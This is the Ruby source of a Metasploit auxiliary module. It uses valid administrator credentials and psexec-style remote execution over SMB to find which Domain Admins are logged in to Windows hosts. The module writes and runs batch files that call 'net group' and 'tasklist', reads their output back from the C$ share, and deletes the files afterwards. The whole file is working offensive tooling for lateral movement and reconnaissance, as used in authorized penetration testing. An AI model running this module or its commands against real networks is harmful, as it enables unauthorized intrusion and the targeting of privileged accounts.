##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
class Metasploit3 < Msf::Auxiliary
  # Exploit mixins should be called first
  include Msf::Exploit::Remote::SMB::Psexec
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  # Aliases for common classes
  SIMPLE = Rex::Proto::SMB::SimpleClient
  XCEPT  = Rex::Proto::SMB::Exceptions
  CONST  = Rex::Proto::SMB::Constants

  def initialize
    super(
      'Name'        => 'Microsoft Windows Authenticated Logged In Domain Administrator Enumeration',
      'Description' => %(This module uses a valid administrator username and password to enumerate domain
        admins logged in, using a similar technique than the "psexec" utility provided
        by SysInternals.
      ),
      'Author'      =>
        [
          'James Cook "b00stfr3ak"', # Metasploit module
          'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>' # SMBexec inspire
        ],
      'References'  => [
        [ 'CVE', '1999-0504'], # Administrator with no password (since this is the default)
        [ 'OSVDB', '3106'],
        [ 'URL', 'http://technet.microsoft.com/en-us/sysinternals/bb897553.aspx' ]
      ],
      'License'     => MSF_LICENSE
    )

    register_options([
      OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),
      OptString.new('RPORT', [true, 'The Target port', 445]),
      OptString.new('WINPATH', [true, 'The name of the Windows directory', 'WINDOWS'])
    ], self.class)

    deregister_options('RHOST')
  end

  # This is the main controller function
  def run_host(ip)
    cmd = "%SYSTEMDRIVE%\\#{datastore['WINPATH']}\\SYSTEM32\\cmd.exe"
    bat = "%SYSTEMDRIVE%\\#{datastore['WINPATH']}\\Temp\\#{Rex::Text.rand_text_alpha(16)}.bat"
    text = "\\#{datastore['WINPATH']}\\Temp\\#{Rex::Text.rand_text_alpha(16)}.txt"
    smbshare = datastore['SMBSHARE']

    # Try and authenticate with given credentials
    begin
      connect
      smb_login
    rescue StandardError => autherror
      print_error("#{peer} - #{autherror}")
      return
    end

    da_list = list_domain_group(cmd, ip, text, bat, smbshare)
    proc_list = list_proccesses(cmd, ip, text, bat, smbshare)

    compare(ip, da_list, proc_list)

    cleanup_after(cmd, text, bat)
    disconnect
  end

  # List Members of domain admin and enterprise admin group
  def list_domain_group(cmd, ip, text, bat, smbshare)
    account_list = []
    delim = '-' * 79
    hit_delim = false
    command = "#{cmd} /C echo net group \"Domain Admins\" /domain ^> %SYSTEMDRIVE%#{text} > #{bat} & "
    command << "echo net group \"Enterprise Admins\" /domain ^>^> %SYSTEMDRIVE%#{text} >> #{bat} & #{cmd} /C start cmd.exe /C #{bat}"
    psexec(command)
    output = get_output(ip, smbshare, text)
    if output
      output.split(/\r?\n/).each do |g|
        hit_delim = false if g.eql?('The command completed successfully.')
        account_list << g.gsub(/\s+/, ' ').chomp(' ').split(' ') if hit_delim
        hit_delim = true if g.eql?(delim)
      end
    end
    account_list.flatten!.uniq!
  end

  # List Logged on Users
  def list_proccesses(cmd, ip, text, bat, smbshare)
    command = "#{cmd} /C echo tasklist /V /FO CSV ^> %SYSTEMDRIVE%#{text} > #{bat} & #{cmd} /C start cmd.exe /C #{bat}"
    psexec(command)
    output = get_output(ip, smbshare, text)
    output = output.split("\r\n")
    users = []
    if output
      output.each_with_index do |line, index|
        next if index == 0
        domain, user = line.split('"')[13].gsub(/"/, '').split('\\')
        next if domain.eql?("NT AUTHORITY")
        users << user unless user.to_s.empty?
      end
    end
    # return uniq users
    users.uniq!
  end

  # Compare proccess list to domain admin list
  def compare(ip, da_list, proc_list)
    da_list.each do |da|
      print_good("#{ip} - Admin #{da} logged in") if proc_list.include?(da)
      report_user(da)
    end
  end

  # This method will retrive output from a specified textfile on the remote host
  def get_output(ip, smbshare, file)
    begin
      simple.connect("\\\\#{ip}\\#{smbshare}")
      outfile = simple.open(file, 'ro')
      output = outfile.read
      outfile.close
      simple.disconnect("\\\\#{ip}\\#{smbshare}")
      return output
    rescue StandardError => output_error
      print_error("#{peer} - Error getting command output. #{output_error.class}. #{output_error}.")
      return false
    end
  end

  def report_user(username)
    report_note(
      host: rhost,
      proto: 'tcp',
      sname: 'smb',
      port: rport,
      type: 'smb.domain.da',
      data: "#{username} is logged in",
      update: :unique_data
    )
  end

  # Cleanup module.  Gets rid of .txt and .bat files created in the #{datastore['WINPATH']}\Temp directory
  def cleanup_after(cmd, text, bat)
    begin
      # Try and do cleanup command
      cleanup = "#{cmd} /C del %SYSTEMDRIVE%#{text} & del #{bat}"
      print_status("#{peer} - Executing cleanup")
      psexec(cleanup)
    rescue StandardError => cleanuperror
      print_error("#{peer} - Unable to processes cleanup commands: #{cleanuperror}")
      print_warning("#{peer} - Maybe %SYSTEMDRIVE%#{text} must be deleted manually")
      print_warning("#{peer} - Maybe #{bat} must be deleted manually")
      return cleanuperror
    end
  end
end
